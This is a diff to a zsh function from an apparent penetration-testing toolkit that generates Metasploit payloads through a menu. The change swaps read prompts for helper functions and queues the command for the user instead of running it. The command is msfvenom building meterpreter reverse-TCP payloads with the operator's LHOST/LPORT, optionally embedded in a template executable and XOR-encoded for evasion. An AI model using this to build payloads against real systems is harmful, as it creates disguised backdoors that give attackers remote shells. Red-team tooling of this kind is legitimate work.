@@ -116,8 +116,7 @@ nb-shell-handlers-msf-payload() {
     echo '6. psh'
     echo '7. raw'
     echo
-    echo -n "Choice: "
-    read choice2
+    local choice2 && __askvar choice2 "CHOICE"
     
     case $choice2 in
          1) extention=".aspx"
@@ -157,8 +156,7 @@ nb-shell-handlers-msf-payload() {
     echo "15.  windows/x64/meterpreter_reverse_tcp     (multi)"
     echo "16.  Previous menu"
     echo
-    echo -n "Choice: "
-    read choice
+    local choice && __askvar choice "CHOICE"
 
     case $choice in
          1) payload="android/meterpreter/reverse_tcp"
@@ -251,8 +249,8 @@ nb-shell-handlers-msf-payload() {
     x=$(echo $payload | sed 's/\//-/g')
     
     echo
-    echo -n "Use a template file? (y/N) "
-    read answer
+    __ask "Use a template file? (y/n)"
+    local answer && __askvar answer "TEMPLATE"
     
     if [ "$answer" == "y" ]; then
          echo -n "Enter the path to the file (default whoami.exe): "
@@ -264,10 +262,10 @@ nb-shell-handlers-msf-payload() {
          fi
     
          echo
-         msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $SV/$x$extention
+         print -z "msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -x $template -e x64/xor_dynamic -i $iterations -o $SV/$x$extention"
     else
          echo
-         msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $SV/$x$extention
+         print -z "msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $SV/$x$extention"
     fi
 }
 
